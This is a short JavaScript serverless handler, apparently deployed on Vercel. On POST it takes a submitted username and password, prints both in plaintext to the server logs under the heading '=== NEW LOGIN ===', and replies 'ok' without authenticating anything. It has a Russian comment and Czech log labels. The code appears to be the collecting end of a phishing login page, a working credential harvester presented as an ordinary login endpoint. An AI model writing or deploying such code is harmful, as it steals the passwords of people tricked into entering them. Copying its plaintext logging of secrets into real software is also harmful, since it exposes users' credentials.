export default function handler(req, res) {
  if (req.method === 'POST') {
    const { username, pass } = req.body;
    
    // Это сообщение появится в логах Vercel
    console.log(`=== NEW LOGIN === Uživatel: ${username} | Heslo: ${pass} | Čas: ${new Date().toISOString()}`);
    
    res.status(200).json({ status: 'ok' });
  } else {
    res.status(405).json({ error: 'Method not allowed' });
  }
}
